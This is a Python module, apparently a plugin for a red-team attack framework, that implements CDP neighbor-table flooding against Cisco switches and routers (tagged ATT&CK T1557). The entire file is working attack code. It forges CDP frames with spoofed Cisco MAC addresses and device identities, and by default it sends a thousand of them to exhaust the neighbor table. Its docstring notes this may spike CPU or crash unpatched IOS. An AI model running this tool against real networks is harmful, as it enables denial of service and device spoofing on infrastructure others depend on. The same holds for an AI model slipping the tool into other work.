"""
CDP Neighbor Flooding — T1557 (Network Infrastructure Manipulation)

Floods the switch/router with hundreds of fake Cisco CDP entries, exhausting
the neighbor table. May trigger CPU spikes or crash on unpatched legacy IOS.
"""
import random
import struct
import time

from scapy.all import Dot3, Ether, LLC, SNAP, sendp

NAME = "cdp"
DESCRIPTION = "CDP neighbor table flooding on Cisco devices"
ATTCK_ID = "T1557"

_CISCO_OUIS = [
    "00:00:0C", "00:01:42", "00:01:63", "00:02:16", "00:03:6B",
    "00:04:4A", "00:05:00", "00:05:73", "00:06:28", "00:07:0D",
    "00:07:4F", "00:07:7D", "00:07:B4", "00:07:EB",
]

_DEVICE_TYPES = [
    "Cisco-Catalyst-2960", "Cisco-Catalyst-3750", "Cisco-Catalyst-3850",
    "Cisco-Catalyst-4500", "Cisco-Catalyst-6500", "Cisco-Nexus-7000",
    "Cisco-Nexus-9000", "Cisco-ASR-1000", "Cisco-ISR-4000", "Cisco-WLC-3504",
]

_PLATFORMS = [
    "cisco WS-C2960X-48FPS-L", "cisco WS-C3750X-48P-S", "cisco WS-C3850-48U-E",
    "cisco WS-C4500X-32SFP+", "cisco WS-C6509-E", "cisco N7K-C7018",
    "cisco N9K-C9336C-FX2", "cisco ASR1001-X", "cisco ISR4451-X",
]


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info("START | technique=%s | iface=%s | count=%d | interval=%.2f",
                ATTCK_ID, args.interface, args.count, args.interval)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True, help="Network interface")
    p.add_argument("--count", "-c", type=int, default=1_000,
                   help="Number of CDP packets (default 1000)")
    p.add_argument("--interval", type=float, default=0.1,
                   help="Interval between packets in seconds (default 0.1)")
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print
    try:
        for i in range(args.count):
            oui = random.choice(_CISCO_OUIS)
            nic = ":".join(f"{random.randint(0,255):02x}" for _ in range(3))
            src_mac = f"{oui}:{nic}"

            device_id = f"{random.choice(_DEVICE_TYPES)}-{random.randint(1,100)}"
            platform = random.choice(_PLATFORMS)
            port_id = f"GigabitEthernet{random.randint(1,48)}/0/{random.randint(1,4)}"

            pkt = _build_cdp(src_mac, device_id, port_id, platform)
            sendp(pkt, iface=args.interface, verbose=args.verbose)

            if (i + 1) % 100 == 0:
                _log(f"[CDP] Sent {i+1}/{args.count} | last device: {device_id}")

            time.sleep(args.interval)

        _log(f"[CDP] Completed — {args.count} fake Cisco neighbors injected")
        return True
    except Exception as e:
        _log(f"[CDP] Error: {e}")
        return False


def _build_cdp(src_mac: str, device_id: str, port_id: str, platform: str) -> Ether:
    """Build a CDP packet manually without scapy.contrib.cdp."""
    payload = b"\x02\xb4\x00\x00"  # version=2, ttl=180, checksum placeholder

    # TLV 0x0001 — Device ID
    dev_bytes = device_id.encode()
    payload += struct.pack(">HH", 0x0001, len(dev_bytes) + 4) + dev_bytes

    # TLV 0x0003 — Port ID
    port_bytes = port_id.encode()
    payload += struct.pack(">HH", 0x0003, len(port_bytes) + 4) + port_bytes

    # TLV 0x0006 — Platform
    plat_bytes = platform.encode()
    payload += struct.pack(">HH", 0x0006, len(plat_bytes) + 4) + plat_bytes

    # TLV 0x0004 — Capabilities (Router + Switch)
    payload += struct.pack(">HHI", 0x0004, 8, 0x00000028)

    # Checksum (ones' complement)
    cs = 0
    for j in range(0, len(payload), 2):
        word = (payload[j] << 8) + (payload[j + 1] if j + 1 < len(payload) else 0)
        cs += word
    cs = (cs & 0xFFFF) + (cs >> 16)
    cs = ~cs & 0xFFFF
    payload = payload[:2] + struct.pack(">H", cs) + payload[4:]

    return (
        Ether(dst="01:00:0c:cc:cc:cc", src=src_mac) /
        Dot3() /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
        SNAP(OUI=0x00000C, code=0x2000) /
        payload
    )
